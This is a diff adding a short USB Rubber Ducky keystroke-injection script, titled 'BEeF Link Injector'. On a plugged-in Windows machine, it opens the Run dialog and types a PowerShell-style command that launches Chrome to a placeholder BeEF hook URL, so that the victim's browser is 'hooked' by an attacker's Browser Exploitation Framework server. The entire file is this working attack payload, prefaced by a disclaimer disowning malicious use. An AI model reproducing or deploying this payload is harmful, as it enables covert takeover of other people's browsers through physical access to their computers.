@@ -1,0 +1,24 @@
+REM ********************
+
+REM THIS SCRIPT WAS MADE BY SLEEPY!
+REM I WILL NOT BE LIABLE FOR ANY SCRIPTS OF MINE BEING USED IN A MALICIOUS MANNER!
+REM USE WITH CAUTION!!
+
+REM ********************
+
+REM BEeF Link Injector (browser hook injector)
+
+REM ********************
+
+DELAY 1000
+REM delay to let device recognize usb device plugged in
+WINDOWS r
+DELAY 250
+STRING [system.Diagnostics.Process]::Start("chrome","https://BEeFlink.here")
+
+REM By default the script will start chrome, if you know your target does not use chrome, simply install it with another script,
+REM or change it to edge for win based pc's.
+
+DELAY 250
+ENTER
+REM Browser is now hooked :)
